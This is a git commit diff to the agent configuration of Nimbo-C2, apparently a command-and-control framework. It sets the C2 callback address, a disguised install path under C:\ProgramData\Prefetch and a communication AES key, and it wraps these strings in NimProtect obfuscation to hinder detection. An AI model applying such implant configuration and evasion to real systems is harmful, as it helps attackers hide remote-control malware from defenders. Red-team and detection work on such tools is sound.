af6a066e8d7a858aa996a7ede1b2dac69bd035d0
Itay Migdal <itaymigdal9@gmail.com>
2023-02-12 22:05:24 +0200

    changed config2agent to include nimprotect

--- Nimbo-C2/agent/config.nim
+++ Nimbo-C2/agent/config.nim
@@ -1,18 +1,20 @@
 
+import NimProtect
+
 ############################ CONFIG ############################
 # C2
-let c2_scheme = "http"
-let c2_address = "localhost"
+let c2_scheme = protectString("http")
+let c2_address = protectString("localhost")
 let c2_port = 80
 # Agent
 let is_exe = true
 let sleep_on_execution = 0
-let agent_execution_path = "C:\\ProgramData\\Prefetch\\na.exe"
+let agent_execution_path = protectString("C:\\ProgramData\\Prefetch\\na.exe")
 var call_home_timeframe = 1
 var call_home_jitter_percent = 1
 # Communication
-let communication_aes_key = "Nimbo-C2 w1ll r0ck y0ur w0rld :)"
-let communication_aes_iv = "----------------"
+let communication_aes_key = protectString("Nimbo-C2 w1ll r0ck y0ur w0rld :)")
+let communication_aes_iv = protectString("----------------")
 # Tasks
 let could_not_retrieve = "-"
 ############################ CONFIG ############################
